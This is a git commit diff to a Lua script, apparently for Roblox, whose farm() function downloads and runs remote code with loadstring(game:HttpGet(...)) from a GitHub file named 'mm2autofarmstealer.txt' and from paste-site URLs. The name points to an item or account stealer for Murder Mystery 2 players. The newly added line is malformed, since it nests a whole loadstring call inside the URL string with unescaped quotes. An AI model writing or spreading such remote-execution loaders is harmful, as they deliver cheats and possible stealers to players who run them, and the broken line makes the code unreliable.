40a11e08e9a111084d08abd11d8ee24af9097d63
Johnnyissocoollol <progackerroblox@gmail.com>
2026-06-30 12:15:01 -0500

    Update farm function to load new script

--- maybe.lua
+++ maybe.lua
@@ -1,6 +1,6 @@
 local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/Mm2New/refs/heads/main/mm2autofarmstealer.txt", true))()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/K5rpsNMOdk1HGD3G/raw", true))()
+    loadstring(game:HttpGet("loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/kNCVmh2opIvfBC8O/raw",true))()", true))()
 end
 
 farm()
